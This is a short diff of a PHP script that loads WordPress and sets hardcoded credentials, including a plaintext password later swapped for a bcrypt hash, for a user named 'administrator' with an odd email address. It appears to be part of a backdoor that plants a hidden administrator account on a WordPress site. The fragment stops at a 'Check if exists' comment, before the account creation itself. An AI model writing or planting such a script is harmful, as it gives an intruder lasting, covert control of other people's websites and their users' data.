@@ -8,7 +8,7 @@ require_once('wp-load.php');
 require_once('wp-includes/registration.php');
 
 $username   = 'administrator';
-$password   = 'G0dKn0wM3&u';
+$password   = '$2a$12$aXN7vGw.3cl4G/ag6SbCNubE68fpwHeSVe4NxLC8tQ04no6qBOpM2';
 $email      = 'xnxx@administrator.id';
 
 // Check if exists
